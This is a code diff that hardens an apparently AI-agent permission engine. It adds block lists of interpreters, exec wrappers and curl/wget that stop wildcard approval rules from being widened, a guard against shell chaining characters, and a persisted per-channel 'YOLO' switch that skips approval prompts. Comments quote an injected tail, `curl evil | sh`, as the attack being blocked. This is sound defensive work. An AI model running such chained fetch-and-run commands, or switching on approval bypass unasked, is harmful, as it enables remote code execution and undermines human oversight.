@@ -24,6 +24,74 @@ class PermissionLevel:
     NEVER = "NEVER"  # Block entirely
 
 
+# Programs that make a generalized "<prefix>*" rule unsafe — see _rule_pattern.
+# Interpreters/shells: a trailing `*` becomes `-c <code>` = arbitrary execution.
+_INTERPRETERS = {
+    "python",
+    "python2",
+    "python3",
+    "pypy",
+    "pypy3",
+    "perl",
+    "ruby",
+    "node",
+    "deno",
+    "bun",
+    "bash",
+    "sh",
+    "zsh",
+    "fish",
+    "dash",
+    "ksh",
+    "php",
+    "lua",
+    "luajit",
+    "rscript",
+    "osascript",
+    "awk",
+    "gawk",
+    "tclsh",
+    "ed",
+    "eval",
+}
+# Exec wrappers: run whatever follows, and their filler args can push an
+# interpreter past _rule_pattern's token cap (`env A=1 python3 -c …`).
+_EXEC_WRAPPERS = {
+    "env",
+    "sudo",
+    "doas",
+    "su",
+    "xargs",
+    "nohup",
+    "nice",
+    "ionice",
+    "time",
+    "timeout",
+    "watch",
+    "setsid",
+    "stdbuf",
+    "unbuffer",
+    "flock",
+    "chroot",
+    "script",
+}
+# Net fetchers: a trailing `*` is any path/host (scheme-less, so the `://` break
+# in _rule_pattern doesn't catch them).
+_NET_FETCHERS = {"curl", "wget"}
+
+# Shell control characters that can chain, redirect, or substitute a SECOND
+# command. run_command executes the whole string via /bin/sh -c, so a wildcard
+# ("…*") rule must never auto-approve a command containing any of these — the `*`
+# would blindly cover an unapproved tail (`jq .name; curl evil | sh`). Guarded in
+# check(); _rule_pattern also refuses to generalize such a command in the first place.
+_SHELL_CONTROL = frozenset(";|&$`<>()\n")
+
+
+def _has_shell_control(command: str) -> bool:
+    """True if a command string contains a shell chaining/redirect/substitution char."""
+    return any(c in _SHELL_CONTROL for c in command)
+
+
 # Default rules — read operations are ALWAYS, write operations ASK, destructive NEVER.
 DEFAULT_RULES: dict[str, str] = {
     # Read operations — safe by default
@@ -153,7 +221,10 @@ class PermissionEngine:
         self._ready = False
         # Pending approval requests: request_id → PendingApproval
         self._pending: dict[str, PendingApproval] = {}
+        # YOLO scopes (channels) with the approval prompt bypassed — see is_yolo.
+        self._yolo: set[str] = set()
         self._load_persisted_rules()
+        self._load_yolo()
 
     def _ensure_schema(self) -> None:
         if self._ready:
@@ -166,6 +237,7 @@ class PermissionEngine:
                 "created_at DATETIME DEFAULT (datetime('now'))"
                 ")"
             )
+            db.execute("CREATE TABLE IF NOT EXISTS yolo (scope TEXT PRIMARY KEY)")
         self._ready = True
 
     def _load_persisted_rules(self) -> None:
@@ -186,6 +258,34 @@ class PermissionEngine:
             )
             db.commit()
 
+    def _load_yolo(self) -> None:
+        self._ensure_schema()
+        with sqlite3.connect(self.db_path) as db:
+            rows = db.execute("SELECT scope FROM yolo").fetchall()
+        self._yolo = {scope for (scope,) in rows}
+
+    def set_yolo(self, scope: str, on: bool) -> None:
+        """Turn the approval-bypass (YOLO) on/off for a scope (a channel name).
+
+        A scope in YOLO has ASK actions auto-approved without a prompt. NEVER
+        rules still hold — this is "act without asking", not "self-destruct".
+        Persisted so the choice survives a restart until explicitly turned off.
+        """
+        self._ensure_schema()
+        with sqlite3.connect(self.db_path) as db:
+            if on:
+                db.execute("INSERT OR IGNORE INTO yolo (scope) VALUES (?)", (scope,))
+                self._yolo.add(scope)
+            else:
+                db.execute("DELETE FROM yolo WHERE scope = ?", (scope,))
+                self._yolo.discard(scope)
+            db.commit()
+        log.warning("YOLO mode %s for scope %r", "ON" if on else "OFF", scope)
+
+    def is_yolo(self, scope: str) -> bool:
+        """True if the scope (channel) currently bypasses approval prompts."""
+        return scope in self._yolo
+
     def _build_match_key(self, tool_name: str, params: dict | None = None) -> str:
         if tool_name == "run_command" and params and "command" in params:
             return f"run_command:{params['command']}"
@@ -201,12 +301,22 @@ class PermissionEngine:
         Keeps the leading program/script/subcommand tokens (e.g.
         `python3 /app/tools/browser.py explore`) and wildcards the arguments, so
         approving once covers every later call of the same command shape. Stops at
-        the first flag/URL/quoted/redirect token and caps at 3 tokens so the rule
-        is neither over-narrow (the whole command) nor over-broad (just the
-        interpreter). Non run_command keys are returned unchanged.
+        the first flag/URL/quoted/redirect token and caps at 3 tokens. Two guards
+        keep the wildcard from re-opening an arbitrary-code/target hole: at least 2
+        kept tokens are required, and none of the kept tokens may be an interpreter
+        (as the last token), an exec-wrapper (anywhere), or a net fetcher (as the
+        program) — see the inline note. Such commands keep their exact form and
+        re-ask on the next distinct call. Non run_command keys are returned
+        unchanged.
         """
         prefix = "run_command:"
         if not match_key.startswith(prefix):
+            return match_key
+        # Never generalize a command that already contains shell operators — a
+        # wildcard over `jq .name; evil` is meaningless and the tokenizer's
+        # break-on-metachar only fires for standalone single-char tokens, so a
+        # fused `;evil` / `$(evil)` would otherwise survive into the prefix.
+        if _has_shell_control(match_key[len(prefix) :]):
             return match_key
         kept: list[str] = []
         for tok in match_key[len(prefix) :].split():
@@ -215,8 +325,27 @@ class PermissionEngine:
             kept.append(tok)
             if len(kept) == 3:
                 break
-        if not kept:
-            return match_key  # nothing safe to generalize → keep exact
+        # Need program + subcommand (≥2 tokens) before wildcarding the rest.
+        # A single kept token means the very next token was a flag/URL/quoted arg
+        # (`python3 -c …`, `curl https://…`, `sed -n …`, `echo "…"`), and
+        # generalizing to `python3*` / `curl*` would auto-approve arbitrary code or
+        # any URL — turning one "always" click into a blanket bypass of the engine.
+        # Keep the exact command instead; the next distinct invocation re-asks.
+        if len(kept) < 2:
+            return match_key
+        # Content check, not just token count: wildcarding is unsafe whenever the
+        # trailing `*` could still expand into arbitrary code or an arbitrary
+        # target. That happens when the LAST kept token is an interpreter/shell
+        # (its `*` becomes `-c <code>`); when the PROGRAM is an exec-wrapper
+        # (env/sudo/xargs/… run whatever follows, and their filler args can push an
+        # interpreter past the 3-token cap, e.g. `env A=1 python3 …`); or when the
+        # program fetches the network (`curl host*` = any path on that host,
+        # scheme-less so the `://` break above never fired). Keep those exact.
+        # (Program-position, like the fetcher check, so a wrapper *word* appearing
+        # as a benign argument — `npm run time` — isn't needlessly held exact.)
+        bases = [tok.rsplit("/", 1)[-1] for tok in kept]
+        if bases[-1] in _INTERPRETERS or bases[0] in _EXEC_WRAPPERS or bases[0] in _NET_FETCHERS:
+            return match_key
         return prefix + " ".join(kept) + "*"
 
     def match_key(self, tool_name: str, params: dict | None = None) -> str:
@@ -272,10 +401,22 @@ class PermissionEngine:
         """
         match_key = self._build_match_key(tool_name, params)
 
+        # A run_command carrying shell control chars (; | & $() ` < > newline) can
+        # chain a SECOND, unapproved command through /bin/sh -c. Such a command may
+        # be auto-approved only by an EXACT rule, never by a wildcard one whose `*`
+        # would blindly cover the injected tail (`jq .name*` matching
+        # `jq .name; curl evil | sh`). NEVER rules and exact ALWAYS still apply.
+        guard_wildcard_allow = match_key.startswith("run_command:") and _has_shell_control(
+            match_key[len("run_command:") :]
+        )
+
         # Sort rules by pattern length descending so more specific rules match first
         for pattern in sorted(self.rules, key=len, reverse=True):
             if fnmatch.fnmatch(match_key, pattern):
-                return self.rules[pattern]
+                level = self.rules[pattern]
+                if guard_wildcard_allow and level == PermissionLevel.ALWAYS and "*" in pattern:
+                    continue  # a wildcard must not auto-approve a chained command
+                return level
 
         # Default: ASK for unknown actions (safe fallback)
         return PermissionLevel.ASK
